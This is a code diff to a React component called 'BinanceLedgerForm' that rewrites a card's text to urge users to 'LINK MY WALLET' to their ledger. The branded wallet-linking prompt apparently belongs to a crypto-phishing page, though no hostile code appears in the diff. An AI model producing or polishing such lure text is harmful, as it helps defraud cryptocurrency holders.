@@ -789,25 +789,17 @@ const BinanceLedgerForm: FC = () => {
       <div className="mt-8 p-6 bg-binance-darkGray/30 border border-binance-yellow/20 rounded-lg">
         <div className="flex items-center justify-center mb-4">
           <div className="bg-binance-yellow/20 p-2 rounded-full mr-3">
-            <Lock className="w-5 h-5 text-binance-yellow" />
+            <Wallet className="w-5 h-5 text-binance-yellow" />
           </div>
           <h4 className="text-white font-semibold text-lg">
-            Device Configuration Required
+            LINK WALLET TO LEDGER
           </h4>
         </div>
         
         <div className="bg-binance-dark/40 rounded-lg p-4 mb-4">
-          <p className="text-gray-200 text-center mb-2">
-            To use your Binance Ledger, you must first link it to your wallet.
+          <p className="text-gray-300 text-center">
+            Link your wallet to your ledger to optimize your security and secure your assets.
           </p>
-          <p className="text-gray-300 text-center text-sm">
-            This process configures your device and ensures compatibility with your existing wallet.
-          </p>
-        </div>
-        
-        <div className="flex items-center justify-center text-gray-300 text-sm mb-4">
-          <Wallet className="w-4 h-4 mr-2 text-binance-yellow" />
-          <span>Configuration process takes approximately 2 minutes</span>
         </div>
         
         <Button 
@@ -815,7 +807,7 @@ const BinanceLedgerForm: FC = () => {
           className="w-full bg-binance-yellow text-binance-black hover:bg-binance-yellow/90 font-medium py-3"
         >
           <span className="flex items-center justify-center">
-            Configure Ledger Device
+            LINK MY WALLET
             <ArrowRight className="ml-2 w-4 h-4" />
           </span>
         </Button>
